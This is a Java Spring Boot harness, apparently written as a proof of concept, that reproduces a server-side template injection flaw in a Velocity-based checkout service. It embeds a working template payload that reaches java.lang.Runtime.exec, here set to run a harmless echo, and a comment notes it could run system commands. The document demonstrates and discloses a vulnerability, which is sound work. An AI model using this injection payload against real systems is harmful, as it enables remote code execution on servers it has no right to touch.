package in.testrepo.checkout.tesst;

import org.apache.velocity.VelocityContext;
import org.apache.velocity.app.VelocityEngine;
import org.apache.velocity.runtime.RuntimeConstants;
import org.apache.velocity.runtime.resource.loader.StringResourceLoader;
import org.apache.velocity.runtime.resource.util.StringResourceRepository;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.context.annotation.Bean;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import java.io.StringWriter;
import java.util.HashMap;
import java.util.Map;
import java.util.Optional;
import java.util.UUID;

/**
 * This test class demonstrates the Server-Side Template Injection (SSTI) vulnerability
 * found in the checkout application. It replicates the flow from user input to template
 * processing that can lead to code execution.
 */
@SpringBootApplication
public class SSTIVulnerabilityTest {

    public static void main(String[] args) {
        SpringApplication.run(SSTIVulnerabilityTest.class, args);
    }
    
    @Bean
    public VelocityEngine velocityEngine() {
        VelocityEngine velocityEngine = new VelocityEngine();
        velocityEngine.setProperty(RuntimeConstants.RESOURCE_LOADERS, "string");
        velocityEngine.setProperty("resource.loader.string.class", StringResourceLoader.class.getName());
        velocityEngine.setProperty("resource.loader.string.repository.name", StringResourceLoader.REPOSITORY_NAME_DEFAULT);
        velocityEngine.setProperty("resource.loader.string.repository.static", "false");
        velocityEngine.init();
        return velocityEngine;
    }
    
    @Bean
    public TestInterpolator testInterpolator(VelocityEngine velocityEngine) {
        return new TestInterpolator(velocityEngine);
    }
    
    @Bean
    public TestTenantCheckoutConfigService testConfigService(TestInterpolator testInterpolator) {
        TestTenantCheckoutConfigService service = new TestTenantCheckoutConfigService(testInterpolator);
        // Set a malicious template that demonstrates the vulnerability
        // In a real attack, this could be more dangerous like executing system commands
        service.setTestTemplate("Hello ${merchantName}! #set($ex = $class.inspect('java.lang.Runtime').getRuntime().exec('echo SSTI Vulnerability Exploited'))");
        return service;
    }
    
    @Bean
    public TestBuildCheckoutTemplate testTemplateBuilder(TestTenantCheckoutConfigService testConfigService) {
        return new TestBuildCheckoutTemplate(testConfigService);
    }
    
    @Bean
    public TestCheckoutWorkflow testWorkflow(TestBuildCheckoutTemplate testTemplateBuilder) {
        return new TestCheckoutWorkflow(testTemplateBuilder);
    }
    
    @Bean
    public TestCheckoutManager testManager(TestCheckoutWorkflow testWorkflow) {
        return new TestCheckoutManager(testWorkflow);
    }

    /**
     * REST Controller that exposes the /check endpoint for testing the SSTI vulnerability
     */
    @RestController
    @RequestMapping("/check")
    static class TestController {
        private final TestCheckoutManager testManager;

        @Autowired
        public TestController(TestCheckoutManager testManager) {
            this.testManager = testManager;
        }

        @PostMapping
        public ResponseEntity<Map<String, Object>> processRequest(@RequestBody TestCheckoutRequest request) {
            System.out.println("[TestController] Received request with user input: " + request.getMerchantName());
            
            // Pass to manager
            TestWorkContext workContext = testManager.processCheckoutOptions(request, "test_user", "test_session");
            
            // Return the processed template as the response
            Map<String, Object> response = new HashMap<>();
            response.put("status", "processed");
            response.put("checkout_view", workContext.get("checkout_view"));
            
            return ResponseEntity.ok(response);
        }
    }

    /**
     * Simulates the CheckoutManager that orchestrates the workflow
     */
    static class TestCheckoutManager {
        private final TestCheckoutWorkflow testWorkflow;

        public TestCheckoutManager(TestCheckoutWorkflow testWorkflow) {
            this.testWorkflow = testWorkflow;
        }

        public TestWorkContext processCheckoutOptions(TestCheckoutRequest request, String userId, String sessionId) {
            System.out.println("[TestCheckoutManager] Processing checkout options");
            
            // Create work context with user input
            TestWorkContext workContext = new TestWorkContext();
            workContext.put("user_id", userId);
            workContext.put("session_id", sessionId);
            workContext.put("checkout_request", request);
            
            // Execute workflow
            testWorkflow.execute(workContext);
            
            return workContext;
        }
    }

    /**
     * Simulates the Workflow that processes the request
     */
    static class TestCheckoutWorkflow {
        private final TestBuildCheckoutTemplate testTemplateBuilder;

        public TestCheckoutWorkflow(TestBuildCheckoutTemplate testTemplateBuilder) {
            this.testTemplateBuilder = testTemplateBuilder;
        }

        public void execute(TestWorkContext workContext) {
            System.out.println("[TestCheckoutWorkflow] Executing workflow");
            
            // Execute template builder
            testTemplateBuilder.execute(workContext);
        }
    }

    /**
     * Simulates the BuildCheckoutTemplate class that builds templates
     */
    static class TestBuildCheckoutTemplate {
        private final TestTenantCheckoutConfigService testConfigService;

        public TestBuildCheckoutTemplate(TestTenantCheckoutConfigService testConfigService) {
            this.testConfigService = testConfigService;
        }

        public void execute(TestWorkContext workContext) {
            System.out.println("[TestBuildCheckoutTemplate] Building checkout template");
            
            // Get user input from work context
            TestCheckoutRequest request = (TestCheckoutRequest) workContext.get("checkout_request");
            String merchantName = request.getMerchantName();
            
            // Create placeholders map with user input
            Map<String, Object> placeholders = new HashMap<>();
            placeholders.put("merchantName", merchantName);
            
            // Add all context to placeholders (in the real app, the entire workContext is passed)
            placeholders.putAll(workContext.getContext());
            
            // Fetch and process template with user input
            Map<String, Object> processedTemplate = testConfigService.fetchInterpolatedTemplate("TEST_TEMPLATE", "test_tenant", placeholders);
            
            // Store result in work context
            workContext.put("checkout_view", processedTemplate);
            
            System.out.println("[TestBuildCheckoutTemplate] Template processing result: " + processedTemplate);
        }
    }

    /**
     * Simulates the TenantCheckoutConfigService that fetches and processes templates
     */
    static class TestTenantCheckoutConfigService {
        private final TestInterpolator testInterpolator;
        private String testTemplate;

        public TestTenantCheckoutConfigService(TestInterpolator testInterpolator) {
            this.testInterpolator = testInterpolator;
        }

        public void setTestTemplate(String template) {
            this.testTemplate = template;
        }

        public Map<String, Object> fetchInterpolatedTemplate(String templateKey, String tenantId, Map<String, Object> placeholders) {
            System.out.println("[TestTenantCheckoutConfigService] Fetching template for key: " + templateKey);
            
            // In the real app, this would fetch from database or cache
            String templateString = testTemplate;
            
            if (templateString == null || templateString.isEmpty()) {
                return new HashMap<>();
            }
            
            // VULNERABILITY: Pass user input to template processor
            return testInterpolator.processInterpolatedTemplate(templateString, placeholders);
        }
    }

    /**
     * Simulates the Interpolator class that processes templates with Velocity
     */
    static class TestInterpolator {
        private final VelocityEngine velocityEngine;

        public TestInterpolator(VelocityEngine velocityEngine) {
            this.velocityEngine = velocityEngine;
        }

        public Optional<String> interpolate(String templateStr, Map<String, Object> placeholders) {
            try {
                System.out.println("[TestInterpolator] Interpolating template: " + templateStr);
                
                // Create a unique template name
                String templateName = UUID.randomUUID().toString();
                
                // Get the string resource repository
                StringResourceRepository repo = (StringResourceRepository)
                        velocityEngine.getApplicationAttribute(StringResourceLoader.REPOSITORY_NAME_DEFAULT);
                
                // Add the template to the repository
                repo.putStringResource(templateName, templateStr);
                
                // Create a context with the placeholders
                VelocityContext context = new VelocityContext(placeholders);
                
                // Process the template
                StringWriter writer = new StringWriter();
                velocityEngine.getTemplate(templateName).merge(context, writer);
                
                // Clean up
                repo.removeStringResource(templateName);
                
                String result = writer.toString();
                System.out.println("[TestInterpolator] Interpolation result: " + result);
                
                return Optional.of(result);
            } catch (Exception e) {
                System.err.println("[TestInterpolator] Error while interpolating template: " + e.getMessage());
                e.printStackTrace();
            }
            return Optional.empty();
        }

        public Map<String, Object> processInterpolatedTemplate(String templateString, Map<String, Object> placeholders) {
            return interpolate(templateString, placeholders)
                    .map(result -> {
                        // In the real app, this would parse the result as JSON
                        // For simplicity, we'll just put it in a map
                        Map<String, Object> resultMap = new HashMap<>();
                        resultMap.put("result", result);
                        return resultMap;
                    })
                    .orElse(new HashMap<>());
        }
    }

    /**
     * Simulates the WorkContext class that holds the request context
     */
    static class TestWorkContext {
        private final Map<String, Object> context = new HashMap<>();

        public void put(String key, Object value) {
            context.put(key, value);
        }

        public Object get(String key) {
            return context.get(key);
        }

        public Map<String, Object> getContext() {
            return context;
        }
    }

    /**
     * Simulates the CheckoutRequest class that holds user input
     */
    static class TestCheckoutRequest {
        private String merchantName;

        public String getMerchantName() {
            return merchantName;
        }

        public void setMerchantName(String merchantName) {
            this.merchantName = merchantName;
        }
    }
}
